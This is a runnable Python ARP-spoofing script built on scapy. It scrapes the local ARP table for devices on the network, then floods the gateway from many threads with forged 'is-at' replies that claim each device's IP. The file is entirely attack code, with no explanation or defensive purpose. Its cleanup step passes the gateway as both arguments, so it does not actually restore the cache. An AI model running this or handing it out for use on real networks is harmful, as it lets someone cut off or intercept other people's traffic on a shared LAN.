import logging,threading,os,time,scapy.all as scapy
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def get_mac(ip):
    ans, _ = scapy.srp(scapy.Ether(dst='ff:ff:ff:ff:ff:ff')/scapy.ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

def arp_scan():
    global gateway_ip,local_ip
    result = []
    out = os.popen('arp -a').read().split('\n')
    for i in range(len(out)):
        try:
            if i> 3 and '2' != out[i].split('.')[0][2]:
                try:
                    result.append(out[i].split(' ')[2])
                except IndexError:
                    break
            elif i == 3:
                gateway_ip = out[i].split(' ')[2]
            elif i == 1:
                local_ip = out[i].split(' ')[1]
        except IndexError:
            pass
    return result


sent_count = 0
thread_count = 0
die_threads = False

def async_scan_thread():
    global devices,gateway_ip
    print("starting async scan..")
    arp_req_frame = scapy.ARP(pdst = gateway_ip)
    broadcast_ether_frame = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    broadcast_ether_arp_req_frame = broadcast_ether_frame / arp_req_frame
    while not die_threads:
        answered_list = scapy.srp(broadcast_ether_arp_req_frame, timeout = 5, verbose = False,multi=True)[0] # 1st scan
        result = []
        for i in range(0,len(answered_list)):
            result.append(answered_list[i][1].psrc) # ip
        try:
            result.remove('192.168.0.119')
        except ValueError:
            pass
        for __ip in result:
            if __ip is not gateway_ip:
                devices.append(__ip)


def spoof(target_ip, spoof_ip):
    global sent_count,die_threads,thread_count
    target_mac = get_mac(spoof_ip)
    if not die_threads:
        arp_response = scapy.ARP(pdst=spoof_ip, hwdst=target_mac, psrc=target_ip, op='is-at')
        scapy.send(arp_response, verbose=0)
        sent_count +=1
        print(f"\rpackets sent: {sent_count} | last ip {target_ip} | threads behind schedule: {thread_count}",end="")

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac,psrc = source_ip, hwsrc = source_mac)

    scapy.send(packet, verbose = False)


if __name__ == "__main__":
    devices = arp_scan()
    print(devices)
    threads = []
    try:
        #threading.Thread(target=async_scan_thread).start()
        print('starting spoof...\n')
        print('\nthis is an infinte loop! press Ctrl+C to restore all spoofing done and exit..')
        while True:
            try:
                for x in devices:
                    t = threading.Thread(target=spoof,args=[x,gateway_ip,])
                    threads.append(t)
                    t.start()
                time.sleep(1)
                for x in range(len(threads)):
                    if not threads[x].is_alive():
                        threads.remove(threads[x])
                thread_count = len(threads)
            except Exception:
                continue
    except KeyboardInterrupt:
        print('\nstopping threads...')
        die_threads = True
        threads.clear()
        print('restoring...')
        restore(gateway_ip, gateway_ip)
        input('spoofing restored. byebye\n')
